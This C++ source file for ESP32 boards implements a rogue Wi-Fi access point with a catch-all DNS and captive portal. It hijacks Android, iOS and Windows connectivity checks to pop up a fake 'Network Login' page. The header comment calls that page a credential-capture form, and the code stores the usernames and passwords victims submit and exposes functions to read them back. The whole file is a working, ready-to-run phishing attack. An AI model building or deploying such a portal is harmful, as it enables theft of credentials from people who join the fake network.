/*
 * wifi_portal.cpp - Shared SoftAP + DNS + HTTP captive portal implementation.
 *
 * Captive portal trigger mechanism:
 *
 *   1. Arduino WiFi.softAP() is used instead of raw IDF — it properly
 *      configures the DHCP server to hand out 192.168.4.1 as both gateway
 *      AND DNS server, so the catch-all DNS actually intercepts OS probes.
 *
 *   2. DHCP Option 114 (Captive Portal URI) is set via
 *      WiFi.softAPenableDHCPCP(true) when arduino-esp32 >= 3.x is in use.
 *      This informs Android 11+ and iOS 14+ of the portal URL in the DHCP
 *      offer itself, triggering the popup without any HTTP probing.
 *
 *   3. All OS connectivity-check endpoints redirect to "/" (302), not serve
 *      HTML directly — a non-204/non-"Success" response is what triggers the
 *      captive browser on Android/iOS/Windows:
 *        Android : GET /generate_204  → expects 204 → redirect triggers popup
 *        iOS     : GET /hotspot-detect.html → expects "Success" body → redirect
 *        Windows : GET /ncsi.txt → expects "Microsoft NCSI" → redirect
 *
 *   4. "/" serves a "Network Login" credential-capture form.
 *      POST /login stores username + password, redirects to /ok.
 *      GET /ok shows a "Success" page (keeps the portal browser happy).
 */
#ifdef BS_WIFI_ESP32
#ifdef ARDUINO_ARCH_ESP32

#include "wifi_portal.h"

extern "C" {
#include "bs/bs_wifi.h"
}

#include <WebServer.h>
#include <DNSServer.h>
#include "esp_wifi.h"
#include "esp_netif.h"
#include <string.h>

/* ── Portal login HTML ────────────────────────────────────────────────────── */

static const char k_portal_html[] PROGMEM =
    "<!DOCTYPE html><html>"
    "<head>"
    "<meta charset='utf-8'>"
    "<meta name='viewport' content='width=device-width,initial-scale=1'>"
    "<title>Network Login</title>"
    "<style>"
    "*{box-sizing:border-box;margin:0;padding:0}"
    "body{background:#f4f4f4;font-family:Arial,sans-serif;min-height:100vh;"
         "display:flex;justify-content:center;align-items:center}"
    ".card{background:#fff;border-radius:8px;box-shadow:0 2px 12px rgba(0,0,0,.15);"
           "padding:2rem 2rem 1.5rem;max-width:360px;width:92%}"
    "h1{font-size:1.2rem;color:#333;margin-bottom:.3rem}"
    "p{font-size:.85rem;color:#666;margin-bottom:1.2rem}"
    "label{display:block;font-size:.85rem;color:#444;margin-bottom:.25rem}"
    "input{width:100%;padding:.6rem .75rem;border:1px solid #ccc;"
           "border-radius:4px;font-size:.95rem;margin-bottom:.9rem;outline:none}"
    "input:focus{border-color:#0077cc}"
    "button{width:100%;padding:.7rem;background:#0077cc;color:#fff;"
            "border:none;border-radius:4px;font-size:1rem;cursor:pointer}"
    "button:active{background:#005fa3}"
    ".footer{text-align:center;font-size:.7rem;color:#aaa;margin-top:1rem}"
    "</style>"
    "</head>"
    "<body>"
    "<div class='card'>"
    "<h1>Sign In to Network</h1>"
    "<p>Enter your credentials to access the internet.</p>"
    "<form method='POST' action='/login'>"
    "<label>Username</label>"
    "<input name='user' type='text' autocomplete='username' required>"
    "<label>Password</label>"
    "<input name='pass' type='password' autocomplete='current-password' required>"
    "<button type='submit'>Sign In</button>"
    "</form>"
    "<div class='footer'>Secured by Network Access Control</div>"
    "</div>"
    "</body>"
    "</html>";

static const char k_ok_html[] PROGMEM =
    "<!DOCTYPE html><html>"
    "<head>"
    "<meta charset='utf-8'>"
    "<meta name='viewport' content='width=device-width,initial-scale=1'>"
    "<title>Connected</title>"
    /* Apple requires exactly this URL to resolve the portal notification */
    "<meta http-equiv='refresh' content='2;url=http://captive.apple.com/hotspot-detect.html'>"
    "<style>"
    "body{background:#fff;font-family:Arial,sans-serif;display:flex;"
         "justify-content:center;align-items:center;min-height:100vh}"
    ".box{text-align:center}"
    "h1{color:#28a745;font-size:1.4rem}"
    "p{color:#555;margin-top:.5rem}"
    "</style>"
    "</head>"
    "<body>"
    "<div class='box'>"
    "<h1>&#10003; Connected</h1>"
    "<p>You are now signed in.</p>"
    "</div>"
    "</body>"
    "</html>";

/* ── Private state ────────────────────────────────────────────────────────── */

static bool      s_active = false;
static WebServer s_server(80);
static DNSServer s_dns;
static const IPAddress k_ap_ip(192, 168, 4, 1);

static wifi_portal_cred_t s_creds[WIFI_PORTAL_MAX_CREDS];
static int                s_cred_count = 0;

/* ── HTTP handlers ────────────────────────────────────────────────────────── */

static void on_redirect(void) {
    s_server.sendHeader("Location", "http://192.168.4.1/", true);
    s_server.send(302, "text/plain", "");
}

static void on_portal(void) {
    s_server.send_P(200, "text/html", k_portal_html);
}

static void on_login(void) {
    if (s_cred_count < WIFI_PORTAL_MAX_CREDS) {
        const String& user = s_server.arg("user");
        const String& pass = s_server.arg("pass");
        strncpy(s_creds[s_cred_count].user, user.c_str(), WIFI_PORTAL_FIELD_LEN - 1);
        s_creds[s_cred_count].user[WIFI_PORTAL_FIELD_LEN - 1] = '\0';
        strncpy(s_creds[s_cred_count].pass, pass.c_str(), WIFI_PORTAL_FIELD_LEN - 1);
        s_creds[s_cred_count].pass[WIFI_PORTAL_FIELD_LEN - 1] = '\0';
        s_cred_count++;
    }
    s_server.sendHeader("Location", "http://192.168.4.1/ok", true);
    s_server.send(302, "text/plain", "");
}

static void on_ok(void) {
    s_server.send_P(200, "text/html", k_ok_html);
}

/* ── Public API ───────────────────────────────────────────────────────────── */

bool wifi_portal_start(const char* ssid, uint8_t channel, const char* password) {
    if (s_active) return true;

    /* Exit any prior monitor/sniff mode */
    bs_wifi_monitor_stop();

    if (!ssid || ssid[0] == '\0') ssid = "FreeWifi";

    /* Guard: recreating an existing netif key asserts-aborts; reuse if present. */
    esp_netif_t* ap_netif = esp_netif_get_handle_from_ifkey("WIFI_AP_DEF");
    if (!ap_netif)
        ap_netif = esp_netif_create_default_wifi_ap();
    if (!ap_netif) return false;

    /* Force DHCP option 6 (DNS) to 192.168.4.1.  arduino-esp32 v3.x/IDF 5.x
     * no longer reliably does this by default (arduino-esp32 #10330), so
     * Android keeps its cellular DNS and our catch-all never sees probes.
     * ESP_NETIF_OP_SET requires the server stopped first; WIFI_EVENT_AP_START
     * restarts it automatically after esp_wifi_set_mode(APSTA).             */
    {
        esp_netif_dhcps_stop(ap_netif);
        uint8_t dns_ip[4] = {192, 168, 4, 1};
        esp_netif_dhcps_option(ap_netif, ESP_NETIF_OP_SET,
                               ESP_NETIF_DOMAIN_NAME_SERVER,
                               dns_ip, sizeof(dns_ip));
    }

    esp_wifi_set_mode(WIFI_MODE_APSTA);   /* fires WIFI_EVENT_AP_START → DHCP up */

    size_t ssid_len = strnlen(ssid, 32);
    wifi_config_t ap_cfg = {};
    memcpy(ap_cfg.ap.ssid, ssid, ssid_len);
    ap_cfg.ap.ssid_len        = (uint8_t)ssid_len;
    ap_cfg.ap.channel         = channel ? channel : 1;
    ap_cfg.ap.max_connection  = 8;
    ap_cfg.ap.beacon_interval = 100;

    size_t pass_len = password ? strnlen(password, 64) : 0;
    if (pass_len >= 8) {
        /* WPA2 if password length >= 8 (minimum PSK length) */
        memcpy(ap_cfg.ap.password, password, pass_len);
        ap_cfg.ap.authmode = WIFI_AUTH_WPA2_PSK;
    } else {
        ap_cfg.ap.authmode = WIFI_AUTH_OPEN;
    }

    if (esp_wifi_set_config(WIFI_IF_AP, &ap_cfg) != ESP_OK) return false;

    /* DHCP Option 114 (Captive Portal URI): triggers Android 11+/iOS 14+
     * browser without waiting for HTTP probes.  IDF 5.2+ only.             */
#if ESP_IDF_VERSION >= ESP_IDF_VERSION_VAL(5, 2, 0)
    {
        const char* portal_uri = "http://192.168.4.1/";
        esp_netif_dhcps_stop(ap_netif);
        esp_netif_dhcps_option(ap_netif, ESP_NETIF_OP_SET,
                               ESP_NETIF_CAPTIVEPORTAL_URI,
                               (void*)portal_uri, strlen(portal_uri));
        esp_netif_dhcps_start(ap_netif);
    }
#endif

    /* DNS catch-all: every hostname resolves to our AP IP */
    s_dns.start(53, "*", k_ap_ip);

    /* OS probe endpoints must 302→"/" not serve HTML: serving HTML directly
     * suppresses the captive popup on several Android/iOS/Windows versions. */
    s_server.on("/",                          HTTP_GET,  on_portal);
    s_server.on("/login",                     HTTP_POST, on_login);
    s_server.on("/ok",                        HTTP_GET,  on_ok);

    s_server.on("/generate_204",              HTTP_GET, on_redirect);  /* Android  */
    s_server.on("/gen_204",                   HTTP_GET, on_redirect);
    s_server.on("/hotspot-detect.html",       HTTP_GET, on_redirect);  /* iOS      */
    s_server.on("/library/test/success.html", HTTP_GET, on_redirect);  /* iOS      */
    s_server.on("/ncsi.txt",                  HTTP_GET, on_redirect);  /* Windows  */
    s_server.on("/connecttest.txt",           HTTP_GET, on_redirect);
    s_server.on("/success.txt",               HTTP_GET, on_redirect);
    s_server.on("/redirect",                  HTTP_GET, on_redirect);
    s_server.onNotFound(on_redirect);

    s_server.begin();
    s_active = true;
    return true;
}

void wifi_portal_stop(void) {
    if (!s_active) return;
    s_server.stop();
    s_dns.stop();
    /* Switch back to STA-only — fires WIFI_EVENT_AP_STOP → DHCP stops.
     * Do NOT call Arduino WiFi.mode() or WiFi.softAPdisconnect(): bs_wifi_esp32
     * owns the netif lifecycle and mixing Arduino calls causes assert-aborts.  */
    esp_wifi_set_mode(WIFI_MODE_STA);
    s_active = false;
}

void wifi_portal_poll(void) {
    if (!s_active) return;
    s_dns.processNextRequest();
    s_server.handleClient();
}

int wifi_portal_client_count(void) {
    if (!s_active) return 0;
    wifi_sta_list_t sta = {};
    esp_wifi_ap_get_sta_list(&sta);
    return (int)sta.num;
}

bool wifi_portal_active(void) { return s_active; }

int wifi_portal_cred_count(void) { return s_cred_count; }

const wifi_portal_cred_t* wifi_portal_get_cred(int idx) {
    if (idx < 0 || idx >= s_cred_count) return nullptr;
    return &s_creds[idx];
}

void wifi_portal_cred_clear(void) { s_cred_count = 0; }

#endif /* ARDUINO_ARCH_ESP32 */
#endif /* BS_WIFI_ESP32 */
